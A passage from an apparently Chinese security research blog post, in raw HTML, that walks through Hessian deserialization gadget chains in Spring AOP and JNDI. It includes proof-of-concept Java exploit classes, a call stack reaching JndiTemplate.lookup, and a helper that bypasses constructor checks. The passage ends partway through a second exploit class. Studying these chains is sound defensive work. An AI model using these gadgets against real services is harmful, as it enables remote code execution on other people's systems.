+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>unserialize</span><span class=p>(</span><span class=n>data</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>private</span><span class=w> </span><span class=kd>static</span><span class=w> </span><span class=kt>void</span><span class=w> </span><span class=nf>setFieldValue</span><span class=p>(</span><span class=n>Object</span><span class=w> </span><span class=n>obj</span><span class=p>,</span><span class=w> </span><span class=n>String</span><span class=w> </span><span class=n>field</span><span class=p>,</span><span class=w> </span><span class=n>Object</span><span class=w> </span><span class=n>value</span><span class=p>)</span><span class=w> </span><span class=kd>throws</span><span class=w> </span><span class=n>Exception</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Field</span><span class=w> </span><span class=n>f</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>obj</span><span class=p>.</span><span class=na>getClass</span><span class=p>().</span><span class=na>getDeclaredField</span><span class=p>(</span><span class=n>field</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>f</span><span class=p>.</span><span class=na>setAccessible</span><span class=p>(</span><span class=kc>true</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>f</span><span class=p>.</span><span class=na>set</span><span class=p>(</span><span class=n>obj</span><span class=p>,</span><span class=w> </span><span class=n>value</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>private</span><span class=w> </span><span class=kd>static</span><span class=w> </span><span class=kt>byte</span><span class=o>[]</span><span class=w> </span><span class=nf>serialize</span><span class=p>(</span><span class=n>Object</span><span class=w> </span><span class=n>obj</span><span class=p>)</span><span class=w> </span><span class=kd>throws</span><span class=w> </span><span class=n>IOException</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>ByteArrayOutputStream</span><span class=w> </span><span class=n>baos</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>ByteArrayOutputStream</span><span class=p>();</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Hessian2Output</span><span class=w> </span><span class=n>hessian2Output</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>Hessian2Output</span><span class=p>(</span><span class=n>baos</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>hessian2Output</span><span class=p>.</span><span class=na>getSerializerFactory</span><span class=p>().</span><span class=na>setAllowNonSerializable</span><span class=p>(</span><span class=kc>true</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>hessian2Output</span><span class=p>.</span><span class=na>writeObject</span><span class=p>(</span><span class=n>obj</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>hessian2Output</span><span class=p>.</span><span class=na>flush</span><span class=p>();</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>return</span><span class=w> </span><span class=n>baos</span><span class=p>.</span><span class=na>toByteArray</span><span class=p>();</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>private</span><span class=w> </span><span class=kd>static</span><span class=w> </span><span class=n>Object</span><span class=w> </span><span class=nf>unserialize</span><span class=p>(</span><span class=kt>byte</span><span class=o>[]</span><span class=w> </span><span class=n>bytes</span><span class=p>)</span><span class=w> </span><span class=kd>throws</span><span class=w> </span><span class=n>IOException</span><span class=p>,</span><span class=w> </span><span class=n>ClassNotFoundException</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>ByteArrayInputStream</span><span class=w> </span><span class=n>bais</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>ByteArrayInputStream</span><span class=p>(</span><span class=n>bytes</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Hessian2Input</span><span class=w> </span><span class=n>hessianInput</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>Hessian2Input</span><span class=p>(</span><span class=n>bais</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>return</span><span class=w> </span><span class=n>hessianInput</span><span class=p>.</span><span class=na>readObject</span><span class=p>();</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>}</span><span class=w>
+</span></span></span></code></pre></td></tr></table></div></div><p>调用栈</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=n>at</span><span class=w> </span><span class=n>org</span><span class=p>.</span><span class=na>springframework</span><span class=p>.</span><span class=na>jndi</span><span class=p>.</span><span class=na>JndiTemplate</span><span class=p>.</span><span class=na>lookup</span><span class=p>(</span><span class=n>JndiTemplate</span><span class=p>.</span><span class=na>java</span><span class=p>:</span><span class=n>178</span><span class=p>)</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>at</span><span class=w> </span><span class=n>org</span><span class=p>.</span><span class=na>springframework</span><span class=p>.</span><span class=na>jndi</span><span class=p>.</span><span class=na>JndiLocatorSupport</span><span class=p>.</span><span class=na>lookup</span><span class=p>(</span><span class=n>JndiLocatorSupport</span><span class=p>.</span><span class=na>java</span><span class=p>:</span><span class=n>96</span><span class=p>)</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>at</span><span class=w> </span><span class=n>org</span><span class=p>.</span><span class=na>springframework</span><span class=p>.</span><span class=na>jndi</span><span class=p>.</span><span class=na>support</span><span class=p>.</span><span class=na>SimpleJndiBeanFactory</span><span class=p>.</span><span class=na>doGetSingleton</span><span class=p>(</span><span class=n>SimpleJndiBeanFactory</span><span class=p>.</span><span class=na>java</span><span class=p>:</span><span class=n>220</span><span class=p>)</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>at</span><span class=w> </span><span class=n>org</span><span class=p>.</span><span class=na>springframework</span><span class=p>.</span><span class=na>jndi</span><span class=p>.</span><span class=na>support</span><span class=p>.</span><span class=na>SimpleJndiBeanFactory</span><span class=p>.</span><span class=na>getBean</span><span class=p>(</span><span class=n>SimpleJndiBeanFactory</span><span class=p>.</span><span class=na>java</span><span class=p>:</span><span class=n>113</span><span class=p>)</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>at</span><span class=w> </span><span class=n>org</span><span class=p>.</span><span class=na>springframework</span><span class=p>.</span><span class=na>aop</span><span class=p>.</span><span class=na>support</span><span class=p>.</span><span class=na>AbstractBeanFactoryPointcutAdvisor</span><span class=p>.</span><span class=na>getAdvice</span><span class=p>(</span><span class=n>AbstractBeanFactoryPointcutAdvisor</span><span class=p>.</span><span class=na>java</span><span class=p>:</span><span class=n>116</span><span class=p>)</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>at</span><span class=w> </span><span class=n>org</span><span class=p>.</span><span class=na>springframework</span><span class=p>.</span><span class=na>aop</span><span class=p>.</span><span class=na>support</span><span class=p>.</span><span class=na>AbstractPointcutAdvisor</span><span class=p>.</span><span class=na>equals</span><span class=p>(</span><span class=n>AbstractPointcutAdvisor</span><span class=p>.</span><span class=na>java</span><span class=p>:</span><span class=n>76</span><span class=p>)</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>at</span><span class=w> </span><span class=n>org</span><span class=p>.</span><span class=na>springframework</span><span class=p>.</span><span class=na>aop</span><span class=p>.</span><span class=na>target</span><span class=p>.</span><span class=na>HotSwappableTargetSource</span><span class=p>.</span><span class=na>equals</span><span class=p>(</span><span class=n>HotSwappableTargetSource</span><span class=p>.</span><span class=na>java</span><span class=p>:</span><span class=n>104</span><span class=p>)</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>at</span><span class=w> </span><span class=n>java</span><span class=p>.</span><span class=na>util</span><span class=p>.</span><span class=na>HashMap</span><span class=p>.</span><span class=na>putVal</span><span class=p>(</span><span class=n>HashMap</span><span class=p>.</span><span class=na>java</span><span class=p>:</span><span class=n>634</span><span class=p>)</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>at</span><span class=w> </span><span class=n>java</span><span class=p>.</span><span class=na>util</span><span class=p>.</span><span class=na>HashMap</span><span class=p>.</span><span class=na>put</span><span class=p>(</span><span class=n>HashMap</span><span class=p>.</span><span class=na>java</span><span class=p>:</span><span class=n>611</span><span class=p>)</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>at</span><span class=w> </span><span class=n>com</span><span class=p>.</span><span class=na>caucho</span><span class=p>.</span><span class=na>hessian</span><span class=p>.</span><span class=na>io</span><span class=p>.</span><span class=na>MapDeserializer</span><span class=p>.</span><span class=na>readMap</span><span class=p>(</span><span class=n>MapDeserializer</span><span class=p>.</span><span class=na>java</span><span class=p>:</span><span class=n>114</span><span class=p>)</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>at</span><span class=w> </span><span class=n>com</span><span class=p>.</span><span class=na>caucho</span><span class=p>.</span><span class=na>hessian</span><span class=p>.</span><span class=na>io</span><span class=p>.</span><span class=na>SerializerFactory</span><span class=p>.</span><span class=na>readMap</span><span class=p>(</span><span class=n>SerializerFactory</span><span class=p>.</span><span class=na>java</span><span class=p>:</span><span class=n>573</span><span class=p>)</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>at</span><span class=w> </span><span class=n>com</span><span class=p>.</span><span class=na>caucho</span><span class=p>.</span><span class=na>hessian</span><span class=p>.</span><span class=na>io</span><span class=p>.</span><span class=na>Hessian2Input</span><span class=p>.</span><span class=na>readObject</span><span class=p>(</span><span class=n>Hessian2Input</span><span class=p>.</span><span class=na>java</span><span class=p>:</span><span class=n>2093</span><span class=p>)</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>at</span><span class=w> </span><span class=n>com</span><span class=p>.</span><span class=na>caucho</span><span class=p>.</span><span class=na>hessian</span><span class=p>.</span><span class=na>io</span><span class=p>.</span><span class=na>MapDeserializer</span><span class=p>.</span><span class=na>readMap</span><span class=p>(</span><span class=n>MapDeserializer</span><span class=p>.</span><span class=na>java</span><span class=p>:</span><span class=n>114</span><span class=p>)</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>at</span><span class=w> </span><span class=n>com</span><span class=p>.</span><span class=na>caucho</span><span class=p>.</span><span class=na>hessian</span><span class=p>.</span><span class=na>io</span><span class=p>.</span><span class=na>SerializerFactory</span><span class=p>.</span><span class=na>readMap</span><span class=p>(</span><span class=n>SerializerFactory</span><span class=p>.</span><span class=na>java</span><span class=p>:</span><span class=n>577</span><span class=p>)</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>at</span><span class=w> </span><span class=n>com</span><span class=p>.</span><span class=na>caucho</span><span class=p>.</span><span class=na>hessian</span><span class=p>.</span><span class=na>io</span><span class=p>.</span><span class=na>Hessian2Input</span><span class=p>.</span><span class=na>readObject</span><span class=p>(</span><span class=n>Hessian2Input</span><span class=p>.</span><span class=na>java</span><span class=p>:</span><span class=n>2093</span><span class=p>)</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>at</span><span class=w> </span><span class=n>org</span><span class=p>.</span><span class=na>hessian</span><span class=p>.</span><span class=na>gadget</span><span class=p>.</span><span class=na>springAopExp</span><span class=p>.</span><span class=na>unserialize</span><span class=p>(</span><span class=n>springAopExp</span><span class=p>.</span><span class=na>java</span><span class=p>:</span><span class=n>62</span><span class=p>)</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>at</span><span class=w> </span><span class=n>org</span><span class=p>.</span><span class=na>hessian</span><span class=p>.</span><span class=na>gadget</span><span class=p>.</span><span class=na>springAopExp</span><span class=p>.</span><span class=na>main</span><span class=p>(</span><span class=n>springAopExp</span><span class=p>.</span><span class=na>java</span><span class=p>:</span><span class=n>42</span><span class=p>)</span><span class=w>
+</span></span></span></code></pre></td></tr></table></div></div><h3 id=spring-context--aop>Spring Context & AOP</h3><p>AspectJAwareAdvisorAutoProxyCreator$PartiallyComparableAdvisorHolder 的 toString 方法，会打印 order 属性，调用 advisor 的 getOrder 方法。</p><p><img src=/p/hessian-deserialization/17.png width=1500 height=618 loading=lazy alt=img></p><p>需要找到类同时实现了 Advisor 和 Ordered 接口，于是找到了 AspectJPointcutAdvisor ，这个类的 getOrder 方法调用 AbstractAspectJAdvice 的 getOrder 方法。</p><p><img src=/p/hessian-deserialization/18.png width=1164 height=164 loading=lazy alt=img></p><p>接着会触发 AspectInstanceFactory 的 getOrder 方法，但是它是个接口，其实现类为 BeanFactoryAspectInstanceFactory</p><p><img src=/p/hessian-deserialization/19.png width=824 height=152 loading=lazy alt=img></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span><span class=lnt>8
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=w>    </span><span class=kd>public</span><span class=w> </span><span class=kt>int</span><span class=w> </span><span class=nf>getOrder</span><span class=p>()</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Class</span><span class=o>&lt;?&gt;</span><span class=w> </span><span class=n>type</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>this</span><span class=p>.</span><span class=na>beanFactory</span><span class=p>.</span><span class=na>getType</span><span class=p>(</span><span class=k>this</span><span class=p>.</span><span class=na>name</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>type</span><span class=w> </span><span class=o>!=</span><span class=w> </span><span class=kc>null</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=k>return</span><span class=w> </span><span class=n>Ordered</span><span class=p>.</span><span class=na>class</span><span class=p>.</span><span class=na>isAssignableFrom</span><span class=p>(</span><span class=n>type</span><span class=p>)</span><span class=w> </span><span class=o>&amp;&amp;</span><span class=w> </span><span class=k>this</span><span class=p>.</span><span class=na>beanFactory</span><span class=p>.</span><span class=na>isSingleton</span><span class=p>(</span><span class=k>this</span><span class=p>.</span><span class=na>name</span><span class=p>)</span><span class=w> </span><span class=o>?</span><span class=w> </span><span class=p>((</span><span class=n>Ordered</span><span class=p>)</span><span class=k>this</span><span class=p>.</span><span class=na>beanFactory</span><span class=p>.</span><span class=na>getBean</span><span class=p>(</span><span class=k>this</span><span class=p>.</span><span class=na>name</span><span class=p>)).</span><span class=na>getOrder</span><span class=p>()</span><span class=w> </span><span class=p>:</span><span class=w> </span><span class=n>OrderUtils</span><span class=p>.</span><span class=na>getOrder</span><span class=p>(</span><span class=n>type</span><span class=p>,</span><span class=w> </span><span class=n>Integer</span><span class=p>.</span><span class=na>MAX_VALUE</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w> </span><span class=k>else</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=k>return</span><span class=w> </span><span class=n>Integer</span><span class=p>.</span><span class=na>MAX_VALUE</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
+</span></span></span></code></pre></td></tr></table></div></div><p>可以触发到 getType 方法，依旧使用 SimpleJndiBeanFactory</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=nd>@Nullable</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=kd>public</span><span class=w> </span><span class=n>Class</span><span class=o>&lt;?&gt;</span><span class=w> </span><span class=n>getType</span><span class=p>(</span><span class=n>String</span><span class=w> </span><span class=n>name</span><span class=p>)</span><span class=w> </span><span class=kd>throws</span><span class=w> </span><span class=n>NoSuchBeanDefinitionException</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=k>try</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>return</span><span class=w> </span><span class=k>this</span><span class=p>.</span><span class=na>doGetType</span><span class=p>(</span><span class=n>name</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w> </span><span class=k>catch</span><span class=w> </span><span class=p>(</span><span class=n>NameNotFoundException</span><span class=w> </span><span class=n>var3</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>throw</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>NoSuchBeanDefinitionException</span><span class=p>(</span><span class=n>name</span><span class=p>,</span><span class=w> </span><span class=s>&#34;not found in JNDI environment&#34;</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w> </span><span class=k>catch</span><span class=w> </span><span class=p>(</span><span class=n>NamingException</span><span class=w> </span><span class=n>var4</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>return</span><span class=w> </span><span class=kc>null</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>}</span><span class=w>
+</span></span></span></code></pre></td></tr></table></div></div><p>查看 doGetType 方法</p><p><img src=/p/hessian-deserialization/20.png width=1306 height=676 loading=lazy alt=img></p><p>可以触发 lookup 方法，但是这里有一些需要注意的点，Spring框架的许多类会在构造方法中进行安全校验或初始化操作，所以这里用到一个方法</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=c1>// 创建实例但是不触发构造方法（避免有防御代码）</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=kd>public</span><span class=w> </span><span class=kd>static</span><span class=w> </span><span class=o>&lt;</span><span class=n>T</span><span class=o>&gt;</span><span class=w> </span><span class=n>T</span><span class=w> </span><span class=nf>createWithoutConstructor</span><span class=p>(</span><span class=n>Class</span><span class=o>&lt;</span><span class=n>T</span><span class=o>&gt;</span><span class=w> </span><span class=n>clazz</span><span class=p>)</span><span class=w> </span><span class=kd>throws</span><span class=w> </span><span class=n>Exception</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=k>return</span><span class=w> </span><span class=n>createWithConstructor</span><span class=p>(</span><span class=n>clazz</span><span class=p>,</span><span class=w> </span><span class=n>Object</span><span class=p>.</span><span class=na>class</span><span class=p>,</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>Class</span><span class=o>[</span><span class=n>0</span><span class=o>]</span><span class=p>,</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>Object</span><span class=o>[</span><span class=n>0</span><span class=o>]</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>}</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=kd>public</span><span class=w> </span><span class=kd>static</span><span class=w> </span><span class=o>&lt;</span><span class=n>T</span><span class=o>&gt;</span><span class=w> </span><span class=n>T</span><span class=w> </span><span class=nf>createWithConstructor</span><span class=p>(</span><span class=n>Class</span><span class=o>&lt;</span><span class=n>T</span><span class=o>&gt;</span><span class=w> </span><span class=n>targetClass</span><span class=p>,</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>                                          </span><span class=n>Class</span><span class=o>&lt;?</span><span class=w> </span><span class=kd>super</span><span class=w> </span><span class=n>T</span><span class=o>&gt;</span><span class=w> </span><span class=n>constructorClass</span><span class=p>,</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>                                          </span><span class=n>Class</span><span class=o>&lt;?&gt;[]</span><span class=w> </span><span class=n>argTypes</span><span class=p>,</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>                                          </span><span class=n>Object</span><span class=o>[]</span><span class=w> </span><span class=n>args</span><span class=p>)</span><span class=w> </span><span class=kd>throws</span><span class=w> </span><span class=n>Exception</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>Constructor</span><span class=o>&lt;?</span><span class=w> </span><span class=kd>super</span><span class=w> </span><span class=n>T</span><span class=o>&gt;</span><span class=w> </span><span class=n>templateCons</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>constructorClass</span><span class=p>.</span><span class=na>getDeclaredConstructor</span><span class=p>(</span><span class=n>argTypes</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>templateCons</span><span class=p>.</span><span class=na>setAccessible</span><span class=p>(</span><span class=kc>true</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>Constructor</span><span class=o>&lt;?&gt;</span><span class=w> </span><span class=n>fakeCons</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>ReflectionFactory</span><span class=p>.</span><span class=na>getReflectionFactory</span><span class=p>().</span><span class=na>newConstructorForSerialization</span><span class=p>(</span><span class=n>targetClass</span><span class=p>,</span><span class=w> </span><span class=n>templateCons</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>fakeCons</span><span class=p>.</span><span class=na>setAccessible</span><span class=p>(</span><span class=kc>true</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=k>return</span><span class=w> </span><span class=p>(</span><span class=n>T</span><span class=p>)</span><span class=w> </span><span class=n>fakeCons</span><span class=p>.</span><span class=na>newInstance</span><span class=p>(</span><span class=n>args</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>}</span><span class=w>
+</span></span></span></code></pre></td></tr></table></div></div><p>而且使用 getField 方法，而不是直接 getDeclaredField，这样可以从父类去查找，然后再用 Xstring 串起来即可</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>  1
+</span><span class=lnt>  2
+</span><span class=lnt>  3
+</span><span class=lnt>  4
+</span><span class=lnt>  5
+</span><span class=lnt>  6
+</span><span class=lnt>  7
+</span><span class=lnt>  8
+</span><span class=lnt>  9
+</span><span class=lnt> 10
+</span><span class=lnt> 11
+</span><span class=lnt> 12
+</span><span class=lnt> 13
+</span><span class=lnt> 14
+</span><span class=lnt> 15
+</span><span class=lnt> 16
+</span><span class=lnt> 17
+</span><span class=lnt> 18
+</span><span class=lnt> 19
+</span><span class=lnt> 20
+</span><span class=lnt> 21
+</span><span class=lnt> 22
+</span><span class=lnt> 23
+</span><span class=lnt> 24
+</span><span class=lnt> 25
+</span><span class=lnt> 26
+</span><span class=lnt> 27
+</span><span class=lnt> 28
+</span><span class=lnt> 29
+</span><span class=lnt> 30
+</span><span class=lnt> 31
+</span><span class=lnt> 32
+</span><span class=lnt> 33
+</span><span class=lnt> 34
+</span><span class=lnt> 35
+</span><span class=lnt> 36
+</span><span class=lnt> 37
+</span><span class=lnt> 38
+</span><span class=lnt> 39
+</span><span class=lnt> 40
+</span><span class=lnt> 41
+</span><span class=lnt> 42
+</span><span class=lnt> 43
+</span><span class=lnt> 44
+</span><span class=lnt> 45
+</span><span class=lnt> 46
+</span><span class=lnt> 47
+</span><span class=lnt> 48
+</span><span class=lnt> 49
+</span><span class=lnt> 50
+</span><span class=lnt> 51
+</span><span class=lnt> 52
+</span><span class=lnt> 53
+</span><span class=lnt> 54
+</span><span class=lnt> 55
+</span><span class=lnt> 56
+</span><span class=lnt> 57
+</span><span class=lnt> 58
+</span><span class=lnt> 59
+</span><span class=lnt> 60
+</span><span class=lnt> 61
+</span><span class=lnt> 62
+</span><span class=lnt> 63
+</span><span class=lnt> 64
+</span><span class=lnt> 65
+</span><span class=lnt> 66
+</span><span class=lnt> 67
+</span><span class=lnt> 68
+</span><span class=lnt> 69
+</span><span class=lnt> 70
+</span><span class=lnt> 71
+</span><span class=lnt> 72
+</span><span class=lnt> 73
+</span><span class=lnt> 74
+</span><span class=lnt> 75
+</span><span class=lnt> 76
+</span><span class=lnt> 77
+</span><span class=lnt> 78
+</span><span class=lnt> 79
+</span><span class=lnt> 80
+</span><span class=lnt> 81
+</span><span class=lnt> 82
+</span><span class=lnt> 83
+</span><span class=lnt> 84
+</span><span class=lnt> 85
+</span><span class=lnt> 86
+</span><span class=lnt> 87
+</span><span class=lnt> 88
+</span><span class=lnt> 89
+</span><span class=lnt> 90
+</span><span class=lnt> 91
+</span><span class=lnt> 92
+</span><span class=lnt> 93
+</span><span class=lnt> 94
+</span><span class=lnt> 95
+</span><span class=lnt> 96
+</span><span class=lnt> 97
+</span><span class=lnt> 98
+</span><span class=lnt> 99
+</span><span class=lnt>100
+</span><span class=lnt>101
+</span><span class=lnt>102
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=kn>package</span><span class=w> </span><span class=nn>org.hessian.gadget</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>com.caucho.hessian.io.Hessian2Input</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>com.caucho.hessian.io.Hessian2Output</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>com.sun.org.apache.xpath.internal.objects.XString</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>org.springframework.aop.aspectj.AbstractAspectJAdvice</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>org.springframework.aop.aspectj.AspectInstanceFactory</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>org.springframework.aop.aspectj.AspectJAroundAdvice</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>org.springframework.aop.aspectj.AspectJPointcutAdvisor</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>org.springframework.aop.aspectj.annotation.BeanFactoryAspectInstanceFactory</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>org.springframework.aop.target.HotSwappableTargetSource</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>org.springframework.jndi.support.SimpleJndiBeanFactory</span><span class=p>;</span><span class=w>
